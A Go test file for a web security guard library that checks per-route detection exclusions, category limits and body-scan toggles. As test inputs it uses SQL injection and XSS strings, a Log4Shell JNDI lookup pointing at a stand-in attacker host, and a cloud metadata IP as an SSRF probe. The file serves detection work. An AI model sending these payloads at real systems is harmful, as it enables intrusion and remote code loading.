package guardcore

// Tests for the per-route detection exclusion surface (the reference
// route_config.detection_exclusion decorator plus enable_suspicious_detection,
// resolved through the _resolve_* helpers of
// guard_core/_utils/detection_config.py). Every test drives the real pipeline
// over a registered route so both the exclusion and the
// excluded-what-still-runs behavior are covered end to end.

import (
	"testing"
)

func boolPtr(v bool) *bool { return &v }

func newExclusionPipeline(t *testing.T, cfg *SecurityConfig, routeID string, mutate func(rc *RouteConfig)) (*SecurityCheckPipeline, *RouteRegistry) {
	t.Helper()
	registry := NewRouteRegistry()
	if routeID != "" {
		registry.Register(routeID, mutate)
	}
	ban := NewIPBanManager(nil, nil)
	rl := NewRateLimitManager(RateLimitConfigFromSecurityConfig(cfg), nil, ban)
	pipeline, _ := BuildDefaultPipeline(cfg, ban, rl, registry)
	return pipeline, registry
}

func runRoutedDetection(t *testing.T, pipeline *SecurityCheckPipeline, routeID string, mutate func(opts *RequestOptions)) *Response {
	t.Helper()
	req := newTestRequest(t, func(opts *RequestOptions, state *RequestState) {
		state.GuardRouteID = routeID
		if mutate != nil {
			mutate(opts)
		}
	})
	return pipeline.Execute(req)
}

func TestRouteExcludedParamSkipsValueButURLPathStillScans(t *testing.T) {
	cfg := testConfig(t)
	pipeline, _ := newExclusionPipeline(t, cfg, "/search", func(rc *RouteConfig) {
		rc.ExcludedDetectionParams = map[string]bool{"q": true}
	})

	// The excluded query param value does not detect on the route.
	if resp := runRoutedDetection(t, pipeline, "/search", func(opts *RequestOptions) {
		opts.QueryParams = map[string]string{"q": "203.0.113.10' OR '1'='1"}
	}); resp != nil {
		t.Fatalf("excluded param must not detect, got %+v", resp)
	}

	// The same payload in the URL path still detects: excluding one surface
	// never disables the others.
	if resp := runRoutedDetection(t, pipeline, "/search", func(opts *RequestOptions) {
		opts.Path = "/search/203.0.113.10' OR '1'='1"
	}); resp == nil || resp.StatusCode != 400 {
		t.Fatalf("URL path must still scan on the route with the param exclusion, got %+v", resp)
	}

	// Another route without the exclusion detects the same param value.
	plain, _ := newExclusionPipeline(t, cfg, "/raw", nil)
	if resp := runRoutedDetection(t, plain, "/raw", func(opts *RequestOptions) {
		opts.QueryParams = map[string]string{"q": "203.0.113.10' OR '1'='1"}
	}); resp == nil || resp.StatusCode != 400 {
		t.Fatalf("global scan must still flag the param without the route exclusion, got %+v", resp)
	}
}

func TestRouteExcludedBodyFieldSkipsFieldButScansOtherFields(t *testing.T) {
	cfg := testConfig(t)
	pipeline, _ := newExclusionPipeline(t, cfg, "/form", func(rc *RouteConfig) {
		rc.ExcludedDetectionBodyFields = map[string]bool{"trusted_field": true}
	})

	// The excluded form field value does not detect.
	if resp := runRoutedDetection(t, pipeline, "/form", func(opts *RequestOptions) {
		opts.Method = "POST"
		opts.Header = map[string]string{"content-type": "application/x-www-form-urlencoded"}
		opts.Body = []byte("trusted_field=${jndi:ldap://evil.example/a}")
	}); resp != nil {
		t.Fatalf("excluded body field must not detect, got %+v", resp)
	}

	// A different field with the same payload still detects.
	if resp := runRoutedDetection(t, pipeline, "/form", func(opts *RequestOptions) {
		opts.Method = "POST"
		opts.Header = map[string]string{"content-type": "application/x-www-form-urlencoded"}
		opts.Body = []byte("other_field=${jndi:ldap://evil.example/a}")
	}); resp == nil || resp.StatusCode != 400 {
		t.Fatalf("non-excluded body field must still detect, got %+v", resp)
	}
}

func TestRouteExcludedHeaderMergesWithDefaultsAndConfig(t *testing.T) {
	cfg := newDetectConfig(t, func(c *SecurityConfig) {
		c.ExcludedDetectionHeaders = map[string]bool{"x-tenant-config": true}
	})
	pipeline, _ := newExclusionPipeline(t, cfg, "/merge", func(rc *RouteConfig) {
		rc.ExcludedDetectionHeaders = map[string]bool{"x-route-opt": true}
	})

	// Route exclusion, config exclusion, and the hardcoded proxy defaults
	// all hold on the route (address values in address-carrying headers).
	if resp := runRoutedDetection(t, pipeline, "/merge", func(opts *RequestOptions) {
		opts.Header = map[string]string{
			"x-route-opt":      "169.254.169.254",
			"x-tenant-config":  "169.254.169.254",
			"x-forwarded-host": "169.254.169.254",
		}
	}); resp != nil {
		t.Fatalf("merged header exclusions must not detect, got %+v", resp)
	}

	// An attack payload in a route-excluded header still detects the
	// non-skipped categories (the exclusion suppresses only the
	// ssrf-shaped false positives).
	if resp := runRoutedDetection(t, pipeline, "/merge", func(opts *RequestOptions) {
		opts.Header = map[string]string{"x-route-opt": "203.0.113.10' OR '1'='1"}
	}); resp == nil || resp.StatusCode != 400 {
		t.Fatalf("route-excluded header must still scan for sqli, got %+v", resp)
	}
}

func TestRouteEnabledCategoriesRestrictDetectionOnThatRouteOnly(t *testing.T) {
	cfg := testConfig(t)
	pipeline, _ := newExclusionPipeline(t, cfg, "/only-sqli", func(rc *RouteConfig) {
		rc.EnabledDetectionCategories = []string{"sqli"}
	})

	// An xss payload does not detect: the category is not enabled on the
	// route.
	if resp := runRoutedDetection(t, pipeline, "/only-sqli", func(opts *RequestOptions) {
		opts.Path = "/only-sqli?q=<script>alert(1)</script>"
	}); resp != nil {
		t.Fatalf("disabled category must not detect on the route, got %+v", resp)
	}

	// An sqli payload still detects.
	if resp := runRoutedDetection(t, pipeline, "/only-sqli", func(opts *RequestOptions) {
		opts.QueryParams = map[string]string{"q": "203.0.113.10' OR '1'='1"}
	}); resp == nil || resp.StatusCode != 400 {
		t.Fatalf("enabled category must still detect on the route, got %+v", resp)
	}

	// Another route keeps the full global category set.
	plain, _ := newExclusionPipeline(t, cfg, "/plain", nil)
	if resp := runRoutedDetection(t, plain, "/plain", func(opts *RequestOptions) {
		opts.Path = "/plain?q=<script>alert(1)</script>"
	}); resp == nil || resp.StatusCode != 400 {
		t.Fatalf("global categories must apply on a route without its own set, got %+v", resp)
	}
}

func TestRouteScanBodyFalseSkipsBodyButStillScansHeaders(t *testing.T) {
	cfg := testConfig(t)
	pipeline, _ := newExclusionPipeline(t, cfg, "/no-body", func(rc *RouteConfig) {
		rc.DetectionScanBody = boolPtr(false)
	})

	if resp := runRoutedDetection(t, pipeline, "/no-body", func(opts *RequestOptions) {
		opts.Method = "POST"
		opts.Header = map[string]string{"content-type": "text/plain"}
		opts.Body = []byte("${jndi:ldap://evil.example/a}")
	}); resp != nil {
		t.Fatalf("detection_scan_body=false must skip the body surface, got %+v", resp)
	}

	if resp := runRoutedDetection(t, pipeline, "/no-body", func(opts *RequestOptions) {
		opts.Header = map[string]string{"x-anything": "203.0.113.10' OR '1'='1"}
	}); resp == nil || resp.StatusCode != 400 {
		t.Fatalf("header surface must still scan with scan_body off, got %+v", resp)
	}

	// The global detection_scan_body=false skips the body everywhere unless
	// a route overrides it back on.
	globalOff := newDetectConfig(t, func(c *SecurityConfig) {
		c.DetectionScanBody = boolPtr(false)
	})
	globalPipeline, _ := newExclusionPipeline(t, globalOff, "/plain", nil)
	if resp := runRoutedDetection(t, globalPipeline, "/plain", func(opts *RequestOptions) {
		opts.Method = "POST"
		opts.Header = map[string]string{"content-type": "text/plain"}
		opts.Body = []byte("${jndi:ldap://evil.example/a}")
	}); resp != nil {
		t.Fatalf("global scan_body=false must skip the body, got %+v", resp)
	}
	override, _ := newExclusionPipeline(t, globalOff, "/scan-here", func(rc *RouteConfig) {
		rc.DetectionScanBody = boolPtr(true)
	})
	if resp := runRoutedDetection(t, override, "/scan-here", func(opts *RequestOptions) {
		opts.Method = "POST"
		opts.Header = map[string]string{"content-type": "text/plain"}
		opts.Body = []byte("${jndi:ldap://evil.example/a}")
	}); resp == nil || resp.StatusCode != 400 {
		t.Fatalf("route override must re-enable the body scan, got %+v", resp)
	}
}

func TestRouteSuspiciousDetectionToggleOverridesGlobal(t *testing.T) {
	cfg := testConfig(t) // global detection on
	pipeline, _ := newExclusionPipeline(t, cfg, "/quiet", func(rc *RouteConfig) {
		rc.EnableSuspiciousDetection = false
	})

	// Route false disables detection on that route even though the global
	// flag is on.
	if resp := runRoutedDetection(t, pipeline, "/quiet", func(opts *RequestOptions) {
		opts.QueryParams = map[string]string{"q": "203.0.113.10' OR '1'='1"}
	}); resp != nil {
		t.Fatalf("enable_suspicious_detection=false must disable detection on the route, got %+v", resp)
	}

	// A sibling route with the default still detects.
	loud, _ := newExclusionPipeline(t, cfg, "/loud", nil)
	if resp := runRoutedDetection(t, loud, "/loud", func(opts *RequestOptions) {
		opts.QueryParams = map[string]string{"q": "203.0.113.10' OR '1'='1"}
	}); resp == nil || resp.StatusCode != 400 {
		t.Fatalf("routes without the toggle must keep detecting, got %+v", resp)
	}

	// Global detection off + route true: the route opts back in (the
	// reference applies_to keeps the check alive for such routes).
	globalOff := newDetectConfig(t, func(c *SecurityConfig) {
		c.EnablePenetrationDetection = false
	})
	optIn, _ := newExclusionPipeline(t, globalOff, "/opt-in", func(rc *RouteConfig) {
		rc.EnableSuspiciousDetection = true
	})
	if resp := runRoutedDetection(t, optIn, "/opt-in", func(opts *RequestOptions) {
		opts.QueryParams = map[string]string{"q": "203.0.113.10' OR '1'='1"}
	}); resp == nil || resp.StatusCode != 400 {
		t.Fatalf("route opt-in must detect with the global flag off, got %+v", resp)
	}
	// ... while an unrouted request stays unchecked.
	if resp := runRoutedDetection(t, optIn, "", func(opts *RequestOptions) {
		opts.QueryParams = map[string]string{"q": "203.0.113.10' OR '1'='1"}
	}); resp != nil {
		t.Fatalf("global detection off must keep unrouted requests unchecked, got %+v", resp)
	}
}

func TestResolveDetectionExclusionsSemantics(t *testing.T) {
	cfg := newDetectConfig(t, func(c *SecurityConfig) {
		c.ExcludedDetectionParams = map[string]bool{"Global": true}
		c.ExcludedDetectionBodyFields = map[string]bool{"global_body": true}
		c.ExcludedDetectionHeaders = map[string]bool{"x-global-header": true}
		c.EnabledDetectionCategories = []string{"sqli", "xss"}
		c.DetectionScanBody = boolPtr(false)
	})

	// No route: config values resolve (lowercased), categories from config,
	// headers merged with the defaults.
	r := resolveDetectionExclusions(cfg, nil)
	if !r.excludedParams["global"] || !r.excludedBodyFields["global_body"] || !r.excludedHeaders["x-global-header"] || !r.excludedHeaders["x-forwarded-for"] {
		t.Fatalf("config resolution mismatch: %+v", r)
	}
	if !r.enabledCategories["sqli"] || !r.enabledCategories["xss"] || r.enabledCategories["ssrf"] {
		t.Fatalf("config category set mismatch: %+v", r.enabledCategories)
	}
	if r.scanBody {
		t.Fatal("config scan_body=false must resolve through")
	}

	// A route overrides each surface it sets; the header set only grows.
	route := &RouteConfig{
		ExcludedDetectionParams:     map[string]bool{"RouteParam": true},
		ExcludedDetectionBodyFields: map[string]bool{"route_body": true},
		ExcludedDetectionHeaders:    map[string]bool{"x-route-header": true},
		EnabledDetectionCategories:  []string{"ssrf"},
		DetectionScanBody:           boolPtr(true),
	}
	r = resolveDetectionExclusions(cfg, route)
	if r.excludedParams["global"] || !r.excludedParams["routeparam"] {
		t.Fatalf("route params must replace config: %+v", r.excludedParams)
	}
	if r.excludedBodyFields["global_body"] || !r.excludedBodyFields["route_body"] {
		t.Fatalf("route body fields must replace config: %+v", r.excludedBodyFields)
	}
	if !r.excludedHeaders["x-route-header"] || !r.excludedHeaders["x-global-header"] || !r.excludedHeaders["host"] {
		t.Fatalf("route headers must merge with config and defaults: %+v", r.excludedHeaders)
	}
	if len(r.enabledCategories) != 1 || !r.enabledCategories["ssrf"] {
		t.Fatalf("route categories must replace config: %+v", r.enabledCategories)
	}
	if !r.scanBody {
		t.Fatal("route scan_body must override config")
	}

	// A route with nil surfaces inherits the config everywhere.
	r = resolveDetectionExclusions(cfg, &RouteConfig{})
	if !r.excludedParams["global"] || !r.excludedBodyFields["global_body"] || !r.enabledCategories["sqli"] || r.scanBody {
		t.Fatalf("nil route surfaces must inherit config: %+v", r)
	}
}
